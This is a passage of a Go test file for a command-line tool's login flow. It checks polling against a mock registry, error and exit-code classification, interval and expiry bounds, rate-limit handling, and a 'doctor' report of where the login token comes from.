	_, err := awaitAuthorization(windowOf(t, clock.at.Add(time.Minute)), client,
		&api.CLIAuthorization{Slug: "aut_x", Interval: 30}, clock.now, clock.sleep)
	if err == nil || err.Error() != "authorization_expired" {
		t.Fatalf("err = %v, want authorization_expired", err)
	}
	if exitCodeFor(err) != exitGone {
		t.Errorf("exit = %d, want %d — deciding it locally must not classify differently "+
			"than being told", exitCodeFor(err), exitGone)
	}
}

// A window that closes having never once reached the registry is a registry that
// could not be reached — not a person who ignored it. Blaming the person would be
// wrong twice over: exit 8 says no retry will help, when retrying is the entire
// fix.
func TestAwaitingApprovalBlamesTheRegistryWhenItNeverAnswered(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadGateway)
		fmt.Fprint(w, `{"error":{"code":"unexpected_error","message":"bad gateway"}}`)
	}))
	t.Cleanup(srv.Close)

	clock := &pollClock{at: time.Now()}

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

	_, err := awaitAuthorization(windowOf(t, clock.at.Add(time.Minute)), client,
		&api.CLIAuthorization{Slug: "aut_x", Interval: 30}, clock.now, clock.sleep)
	if err == nil {
		t.Fatal("a window spent entirely against a broken registry succeeded")
	}
	if err.Error() == "authorization_expired" {
		t.Fatalf("err = %v, which blames a person for a question krowk never got to ask", err)
	}
	if got := exitCodeFor(err); got != exitServer {
		t.Errorf("exit = %d, want %d — the registry failed on its side, and retrying is the fix",
			got, exitServer)
	}
}

// A registry that answered once and was then down for the rest of the window is
// an outage, not a person ignoring a request. Latching on "it answered at least
// once" would report exit 8 — no retry brings it back — about a window krowk spent
// unable to ask, where retrying is the entire fix.
func TestAwaitingApprovalBlamesTheRegistryWhenItStoppedAnswering(t *testing.T) {
	// Fifteen seconds inside a one-minute window is three polls: enough for the
	// answer to change partway through it.
	var polls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if polls.Add(1) == 1 {
			fmt.Fprint(w, `{"slug":"aut_x","state":"pending"}`)
			return
		}
		w.WriteHeader(http.StatusBadGateway)
		fmt.Fprint(w, `{"error":{"code":"unexpected_error","message":"bad gateway"}}`)
	}))
	t.Cleanup(srv.Close)

	clock := &pollClock{at: time.Now()}

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

	_, err := awaitAuthorization(windowOf(t, clock.at.Add(time.Minute)), client,
		&api.CLIAuthorization{Slug: "aut_x", Interval: 15}, clock.now, clock.sleep)
	if err == nil || err.Error() == "authorization_expired" {
		t.Fatalf("err = %v, which blames a person for a window krowk could not ask in", err)
	}
	if got := exitCodeFor(err); got != exitServer {
		t.Errorf("exit = %d, want %d — the registry stopped answering, and retrying is the fix",
			got, exitServer)
	}
}

// And the other way round: a registry that answered, however badly at first, and
// then went on saying pending until the window closed, really is a login nobody
// approved.
func TestAwaitingApprovalStillBlamesNobodyApprovingAfterTheRegistryRecovers(t *testing.T) {
	var polls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if polls.Add(1) <= 3 {
			w.WriteHeader(http.StatusBadGateway)
			fmt.Fprint(w, `{"error":{"code":"unexpected_error","message":"bad gateway"}}`)
			return
		}
		fmt.Fprint(w, `{"slug":"aut_x","state":"pending"}`)
	}))
	t.Cleanup(srv.Close)

	clock := &pollClock{at: time.Now()}

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

	_, err := awaitAuthorization(windowOf(t, clock.at.Add(time.Minute)), client,
		&api.CLIAuthorization{Slug: "aut_x", Interval: 15}, clock.now, clock.sleep)
	if err == nil || err.Error() != "authorization_expired" {
		t.Fatalf("err = %v, want authorization_expired — the registry did answer in the end", err)
	}
}

// An approval with no key in it is the registry's side of the contract broken, and
// the one case where there is nothing to salvage: storing an empty token would
// leave a machine that looks logged in and cannot upload.
//
// A missing key_id or workspace is deliberately *not* here. The plaintext has
// already left the registry by the time this read returns, so refusing would throw
// a working key away — see the login test below, which stores it and withholds the
// claim about it instead.
func TestAwaitingApprovalRefusesAnApprovalWithNoKeyInIt(t *testing.T) {
	for _, missing := range []string{
		`{"slug":"aut_x","state":"approved","key_id":"key_1","workspace":"ws_1"}`,
		`{"slug":"aut_x","state":"approved"}`,
	} {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, missing)
		}))

		client := api.New(srv.URL+"/v1", "")
		client.Sleep = func(time.Duration) {}

		_, err := awaitAuthorization(windowOf(t, time.Now().Add(time.Hour)), client,
			&api.CLIAuthorization{Slug: "aut_x"}, time.Now, func(time.Duration) {})
		srv.Close()

		if err == nil || err.Error() != "malformed_response" {
			t.Errorf("err = %v for %s, want malformed_response", err, missing)
		}
		if got := exitCodeFor(err); got != exitServer {
			t.Errorf("exit = %d for %s, want %d", got, missing, exitServer)
		}
	}
}

// `spent` is the other 410 this endpoint answers, and the registry spells it the
// same whatever the record is. Advice about an artifact would be nonsense here,
// and so would advice about a window that closed — this key was collected.
func TestAwaitingApprovalSaysWhenTheKeyWasAlreadyCollected(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusGone)
		fmt.Fprint(w, `{"error":{"code":"spent","message":"Already collected."}}`)
	}))
	t.Cleanup(srv.Close)

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}

	_, err := awaitAuthorization(windowOf(t, time.Now().Add(time.Hour)), client,
		&api.CLIAuthorization{Slug: "aut_x"}, time.Now, func(time.Duration) {})

	var apiErr *api.Error
	if !errors.As(err, &apiErr) || apiErr.Code() != "spent" {
		t.Fatalf("err = %v, want spent", err)
	}
	fix := apiErr.Fix()
	if !strings.Contains(fix, "already collected") || !strings.Contains(fix, "auth login") {
		t.Errorf("fix = %q, which does not say the key is gone or what to do about it", fix)
	}
	if strings.Contains(fix, "lapsed") || strings.Contains(fix, "upload") {
		t.Errorf("fix = %q, which is advice for a different 410", fix)
	}
	if got := exitCodeFor(err); got != exitGone {
		t.Errorf("exit = %d, want %d", got, exitGone)
	}
}

// The registry sets the pace and krowk bounds it, so a registry answering
// something absurd cannot make the CLI hammer it or fall asleep against it.
func TestPollIntervalIsTheRegistrysWithinBounds(t *testing.T) {
	for _, c := range []struct {
		said int
		want time.Duration
	}{
		{said: 0, want: defaultPollInterval},
		{said: -5, want: defaultPollInterval},
		{said: 1, want: minPollInterval},
		{said: 7, want: 7 * time.Second},
		{said: 3600, want: maxPollInterval},
	} {
		if got := pollInterval(c.said); got != c.want {
			t.Errorf("pollInterval(%d) = %s, want %s", c.said, got, c.want)
		}
	}
}

// The registry's expiry, bounded the same way. The floor is for a machine whose
// clock is minutes off the registry's: it would otherwise abandon a perfectly
// good login before its first poll, and the registry stays the authority on
// whether the window has really closed.
func TestTheAuthorizationWindowIsTheRegistrysWithinBounds(t *testing.T) {
	now := time.Now()
	for _, c := range []struct {
		expiresAt string
		want      time.Duration
	}{
		{expiresAt: "", want: defaultAuthorizationWindow},
		{expiresAt: "sometime soon", want: defaultAuthorizationWindow},
		{expiresAt: now.Add(-time.Hour).UTC().Format(time.RFC3339), want: minAuthorizationWindow},
		{expiresAt: now.Add(10 * time.Minute).UTC().Format(time.RFC3339), want: 10 * time.Minute},
		{expiresAt: now.Add(48 * time.Hour).UTC().Format(time.RFC3339), want: maxAuthorizationWindow},
	} {
		// RFC3339 carries whole seconds, so the round trip loses the fraction.
		if got := authorizationDeadline(c.expiresAt, now).Sub(now); (got - c.want).Abs() > time.Second {
			t.Errorf("deadline for %q is %s away, want %s", c.expiresAt, got, c.want)
		}
	}
}

// Doctor names the two things that decide where an upload lands: which of the
// two sources the token came from, and the workspace login recorded for it.
func TestDoctorNamesTheTokenSourceAndTheRecordedWorkspace(t *testing.T) {
	h, _ := loginHarness(t)

	if _, _, stderr := h.run("auth", "login", "--token", "krowk_sk_pasted"); stderr != "" {
		t.Fatalf("login failed: %s", stderr)
	}

	report := doctorReport(t, h)
	if src, _ := report["token_source"].(string); src != api.TokenSourceFile {
		t.Errorf("token_source = %v, want %q", report["token_source"], api.TokenSourceFile)
	}
	if ws, _ := report["workspace"].(string); !strings.HasPrefix(ws, "ws_") {
		t.Errorf("workspace = %v, want the one login recorded", report["workspace"])
	}
}

// KROWK_TOKEN outranks the file, so the recorded workspace belongs to a key
// that is not in play. Doctor has to withhold it: naming a workspace uploads
// are not going to would be a wrong answer given confidently.
func TestDoctorWithholdsTheRecordedWorkspaceWhenTheEnvironmentSuppliesTheToken(t *testing.T) {
	h, _ := loginHarness(t)

	if _, _, stderr := h.run("auth", "login", "--token", "krowk_sk_pasted"); stderr != "" {
		t.Fatalf("login failed: %s", stderr)
	}
	recorded, _ := doctorReport(t, h)["workspace"].(string)
	if recorded == "" {
		t.Fatal("nothing was recorded, so there is nothing to withhold")
	}

	h.env["KROWK_TOKEN"] = "krowk_sk_from_ci"

	report := doctorReport(t, h)
	if src, _ := report["token_source"].(string); src != api.TokenSourceEnv {
		t.Errorf("token_source = %v, want %q", report["token_source"], api.TokenSourceEnv)
	}
	ws, _ := report["workspace"].(string)
	if ws == recorded {
		t.Errorf("workspace = %v, which belongs to the key in the file, not the one in use", ws)
	}
	if !strings.Contains(ws, "unknown") {
		t.Errorf("workspace = %v, want it to say it does not know", ws)
	}
}

func doctorReport(t *testing.T, h *harness) map[string]any {
	t.Helper()
	code, stdout, stderr := h.run("doctor")
	if code != 0 {
		t.Fatalf("doctor exited %d, stderr: %s", code, stderr)
	}
	var report map[string]any
	if err := json.Unmarshal([]byte(stdout), &report); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, stdout)
	}
	return report
}

// loginEnvelope decodes login's own envelope. The shared harness envelope has a
// fixed Data shape that drops anything it does not know, which would make these
// assertions pass against no output at all.
func loginEnvelope(t *testing.T, h *harness, args ...string) struct {
	OK      bool         `json:"ok"`
	Data    output.Login `json:"data"`
	Summary string       `json:"summary"`
} {
	t.Helper()
	code, stdout, stderr := h.run(args...)
	if code != 0 {
		t.Fatalf("`krowk %s` exited %d, stderr:\n%s", strings.Join(args, " "), code, stderr)
	}
	var e struct {
		OK      bool         `json:"ok"`
		Data    output.Login `json:"data"`
		Summary string       `json:"summary"`
	}
	if err := json.Unmarshal([]byte(stdout), &e); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, stdout)
	}
	return e
}

// A registry answering an absurd interval must not come out at the floor. The
// multiply overflows time.Duration and wraps negative, which sails past the
// ceiling and lands on the minimum — failing in exactly the hammering direction
// the bound exists to prevent.
func TestPollIntervalSurvivesAnAbsurdInterval(t *testing.T) {
	for _, said := range []int{3601, 1 << 40, 10_000_000_000, math.MaxInt32} {
		if got := pollInterval(said); got != maxPollInterval {
			t.Errorf("pollInterval(%d) = %s, want the ceiling %s", said, got, maxPollInterval)
		}
	}
}

// A rate limit names the wait it wants, and this endpoint is one the registry
// meters. Coming back after the interval regardless would be arguing with it.
func TestAwaitingApprovalHonoursARetryAfterOnItsOwnLoop(t *testing.T) {
	var polls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if polls.Add(1) <= 3 {
			w.Header().Set("Retry-After", "45")
			w.WriteHeader(http.StatusTooManyRequests)
			fmt.Fprint(w, `{"error":{"code":"too_many_requests","message":"slow down"}}`)
			return
		}
		fmt.Fprint(w, `{"slug":"aut_x","state":"approved","token":"krowk_sk_new",`+
			`"key_id":"key_1","workspace":"ws_1"}`)
	}))
	t.Cleanup(srv.Close)

	client := api.New(srv.URL+"/v1", "")
	client.Sleep = func(time.Duration) {}
	var waited []time.Duration

	granted, err := awaitAuthorization(windowOf(t, time.Now().Add(time.Hour)), client,
		&api.CLIAuthorization{Slug: "aut_x", Interval: 1},
		time.Now, func(d time.Duration) { waited = append(waited, d) })
	if err != nil {
		t.Fatalf("a login approved after a rate limit failed: %v", err)
	}
	if granted.Token != "krowk_sk_new" {
		t.Errorf("token = %q", granted.Token)
	}
	// The first wait is the interval, before the first read. The second is what the
	// registry asked for rather than the one second it would otherwise have been.
	if len(waited) != 2 || waited[0] != time.Second || waited[1] != 45*time.Second {
		t.Errorf("waits = %v, want [1s 45s]", waited)
	}
}
